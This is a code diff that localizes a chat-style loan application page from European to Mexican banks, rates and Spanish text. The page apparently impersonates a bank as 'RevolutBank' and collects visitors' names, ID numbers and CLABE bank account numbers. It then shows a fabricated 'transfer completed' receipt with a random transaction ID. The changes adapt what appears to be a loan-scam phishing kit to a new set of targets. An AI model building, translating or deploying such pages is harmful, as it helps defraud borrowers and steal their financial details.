@@ -196,7 +196,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
     </div>
 
     <div class="messages" id="messages">
-<div class="sim-box" id="simBox"><div class="sim-row"><input class="sim-input" id="simInput" type="text" maxlength="10" placeholder="type YES to confirm..." autocomplete="off"/><button class="sim-btn" id="simBtn"><svg fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path d="M22 2L11 13" stroke-linecap="round" stroke-linejoin="round"/><path d="M22 2L15 22 11 13 2 9l20-7z" stroke-linecap="round" stroke-linejoin="round"/></svg></button></div></div>
+<div class="sim-box" id="simBox"><div class="sim-row"><input class="sim-input" id="simInput" type="text" maxlength="10" placeholder="escribe SÍ para confirmar..." autocomplete="off"/><button class="sim-btn" id="simBtn"><svg fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path d="M22 2L11 13" stroke-linecap="round" stroke-linejoin="round"/><path d="M22 2L15 22 11 13 2 9l20-7z" stroke-linecap="round" stroke-linejoin="round"/></svg></button></div></div>
       <div class="row them" id="typingRow">
         <div class="bubble-pic"></div>
         <div class="bubble"><div class="typing"><span></span><span></span><span></span></div></div>
@@ -218,10 +218,12 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
     </div>
 
     <div class="options" id="options3" style="display:none">
-      <button class="opt3" data-v="Santander">Santander</button>
-      <button class="opt3" data-v="BNP Paribas">BNP Paribas</button>
-      <button class="opt3" data-v="Deutsche Bank">Deutsche Bank</button>
-      <button class="opt3" data-v="N26">N26</button>
+      <button class="opt3" data-v="BBVA México">BBVA México</button>
+      <button class="opt3" data-v="Banorte">Banorte</button>
+      <button class="opt3" data-v="Santander México">Santander México</button>
+      <button class="opt3" data-v="Citibanamex">Citibanamex</button>
+      <button class="opt3" data-v="HSBC México">HSBC México</button>
+      <button class="opt3" data-v="Banco Azteca">Banco Azteca</button>
       <button class="opt3" data-v="Otro banco">Otro banco</button>
     </div>
 
@@ -289,7 +291,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
   }
   if(nif){
     var d = nif.replace(/\D/g,'');
-    if(d.length>=9) document.getElementById('userNif').textContent = d.slice(0,3)+' *** *'+d.slice(7,9);
+    if(d.length>=18) document.getElementById('userNif').textContent = d.slice(0,4)+' *** '+d.slice(-4);
   }
 
   var firstName = (nome.trim().split(/\s+/)[0]||'customer').toLowerCase();
@@ -355,7 +357,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
       addMe(v);
       document.getElementById('options').style.display='none';
       addTyping();
-      addThem('Perfect! ¿Tienes una cuenta bancaria activa a tu nombre?', function(){
+      addThem('¿Tienes una cuenta bancaria activa a tu nombre?', function(){
         document.getElementById('options2').style.display = 'flex';
       });
     });
@@ -386,7 +388,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
       document.getElementById('options3').style.display='none';
       addTyping();
       var bankLabel = v === 'Otro banco' ? 'Otro banco' : v;
-      addThem('Perfect! Confirmar the CLABE de tu '+bankLabel+' cuenta bancaria donde deseas recibir el monto del préstamo.', function(){
+      addThem('¡Perfecto! Confirma la CLABE de tu '+bankLabel+' cuenta bancaria donde deseas recibir el monto del préstamo.', function(){
         var box = document.getElementById('ibanBox');
         box.style.display='flex';
         var _ii=document.getElementById('ibanInput');
@@ -436,7 +438,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
     addMe(val);
     document.getElementById('ibanConfirmar').style.display='none';
     addTyping();
-    addThem('Last question! When would you like to start paying the cuotas?', function(){
+    addThem('¡Última pregunta! ¿Cuándo te gustaría empezar a pagar las cuotas?', function(){
       document.getElementById('options4').style.display = 'flex';
     });
   });
@@ -523,7 +525,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
           renderReceipt(principal, n, valorParcela, valorTotal);
           setTimeout(function(){
             addTyping();
-            addThem('Confirmar by typing "YES" to finalize your request:', function(){
+            addThem('Por favor escribe <strong>SÍ</strong> para confirmar y finalizar:', function(){
               var sb=document.getElementById('simBox'),msgs2=document.getElementById('messages');
               msgs2.appendChild(sb);
               sb.style.display='flex';
@@ -546,7 +548,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
     addMe(fmtEUR(principal));
     document.getElementById('amountBox').style.display='none';
     addTyping();
-    addThem('Great! Now choose how many cuotas you want to pay in:', function(){
+    addThem('¡Genial! Ahora elige en cuántas cuotas quieres pagar:', function(){
       renderParcelas(principal);
     });
   });
@@ -566,8 +568,8 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
     var txId = 'E' + Math.floor(Math.random()*9e7+1e7).toString();
 
     // Approximate borrowing rate, CAT, and total amount payable (EU Consumer Credit Directive terms)
-    var borrowingRate = 4.60;
-    var aprc = 5.90;
+    var borrowingRate = 24.9;
+    var aprc = 26.9;
     var totalPayable = (valorParcela * n).toFixed(2);
     var totalPayableFmt = '$ ' + parseFloat(totalPayable).toLocaleString('es-MX', {minimumFractionDigits:2, maximumFractionDigits:2});
 
@@ -576,7 +578,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
       '<div class="row-i"><div class="k">Cuotas</div><div class="vv">'+n+'x de '+fmtEUR(valorParcela)+'</div></div>' +
       '<div class="row-i"><div class="k">Tasa de interés</div><div class="vv">'+borrowingRate.toFixed(2)+'%</div></div>' +
       '<div class="row-i"><div class="k">CAT</div><div class="vv">'+aprc.toFixed(2)+'%</div></div>' +
-      '<div class="row-i"><div class="k">Monto Total Payable</div><div class="vv">'+totalPayableFmt+'</div></div>' +
+      '<div class="row-i"><div class="k">Monto Total a Pagar</div><div class="vv">'+totalPayableFmt+'</div></div>' +
       '<div class="row-i"><div class="k">Fecha/Hora</div><div class="vv">'+dd+' '+hh+'</div></div>' +
       '<div class="row-i"><div class="k">ID de transacción</div><div class="vv">'+txId+'</div></div>' +
       '<div class="foot"><b>Transferencia completada exitosamente</b>RevolutBank — Con sede en Ciudad de México</div>';
@@ -609,7 +611,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
     msgs.appendChild(row);
     window.scrollTo(0, document.body.scrollHeight);
 
-    if(val === 'YES'){
+    if(['YES','SI','SÍ','SÌ','si','sí','yes'].includes(val.trim())){
       document.getElementById('simBox').style.display='none';
 
       addTyping();
@@ -622,7 +624,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
     } else {
       // Response if the wrong value was typed
       addTyping();
-      addThem('Please confirm by typing exactly <strong>YES</strong> to proceed.', function(){
+      addThem('Por favor escribe exactamente <strong>SÍ</strong> para continuar.', function(){
         document.getElementById('simInput').focus();
       }, 600);
     }
